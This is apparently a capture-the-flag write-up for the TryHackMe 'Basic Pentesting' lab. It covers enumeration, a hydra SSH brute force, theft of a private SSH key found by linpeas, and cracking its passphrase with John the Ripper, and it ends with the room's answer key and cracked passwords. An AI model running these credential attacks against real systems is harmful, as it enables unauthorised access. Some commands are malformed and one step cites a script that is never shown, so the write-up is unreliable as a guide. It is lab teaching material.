# THM - Basic Pentesting
**security - webapp - boot2root - cracking**

## Enumeration
IP Address : 10.10.248.89
### 1.1 
#### nmap
**nmap -A 10.10.248.89**
	- 22 : ssh
	- 80 : http Apache httpd 2.4.18 ((Ubuntu))
### 1.2 
#### gobuster
**gobuster dir -u http://10.10.248.89 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
	- /development
		dev.txt : "2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
			to host that on this server too. Haven't made any real web apps yet, but I have tried that example
			you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
			using version 2.5.12, because other versions were giving me trouble. -K
			2018-04-22: SMB has been configured. -K
			2018-04-21: I got Apache set up. Will put in our content later. -J"
		j.txt : "For J:
			I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
			and I was able to crack your hash really easily. You know our password policy, so please follow
			it? Change that password ASAP.
			-K"

	- /server-status => forbidden
### 1.3 
#### enum4linux
**enum4linux -a 10.10.248.89** 
	-S-1-22-1-1000 Unix User\kay (Local User)
	-S-1-22-1-1001 Unix User\jan (Local User)
### Conclusion, vulnerabilities
2 open ports, I put my efforts to the 80. 
Finding notes, with informations like Jan ssh password is really simple to crack

## Exploit
### 1.1
#### hydra
**hydra -l jan -P rockyou.txt 10.10.248.89 ssh**
    - [22][ssh] host: 10.10.248.89
        login: jan   password: armando
### 1.2
#### SSH
**ssh jan@10.10.248.89 -p armando**
**python -c 'import pty; pty.spawn("/bin/bash")'**
Stabilize shell

### Conclusion
46635.py script work, the next step is jsut to connect with ssh protocol and find the flag.

## Privilege escalation
### 1.1
#### Enumeration with linpeas
I need to dl the script in target machine, i will use scp protocol for it : 
To my machine : 
**scp ./linpeas.sh jan@10.10.248.89:/dev/shm -p armando**
In target machine : 
**cd /dev/shm**
linpeas.sh
**chmod +x linpeas.sh**
**./linpeas.sh**
    - Private SSH keys found!:
        /home/kay/.ssh/id_rsa
**cat id_rsa**
copy to a text file the sysout to my machine
**chmod 600 id_rsa**
**ssh -i id_rsa@10.10.248.89**
A passphrase is configured
### 1.2
#### JohnTheRipper
**/opt/JohnTheRipper/run/ssh2john.py id_rsa > johnHash.txt**
We have the hash, so it's possible to run the john programm.
**/opt/JohnTheRipper/run/john.py johnHash.tx --wordlist=/opt/rockyou.txt**
beeswax
### 1.3
#### ssh
**ssh -i id_rsa@10.10.248.89**
passphrase : beeswax
**ls -la**
Find password ! 
### Conclusion
Thank to linpeas, I find a ssh key, so after copy to my computer, and use JohnTheRipper to find the passphrase, I am able to be connected with ssh with the user kay.

## Responses
### What is the username? : 
**jan**
### What is the password? : 
**armando**
### What service do you use to access the server(answer in abbreviation in all caps) : 
**SSH**
### What is the name of the other user you found(all lower case)? : 
**kay**
### What is the final password you obtain? : 
**heresareallystrongpasswordthatfollowsthepasswordpolicy$$**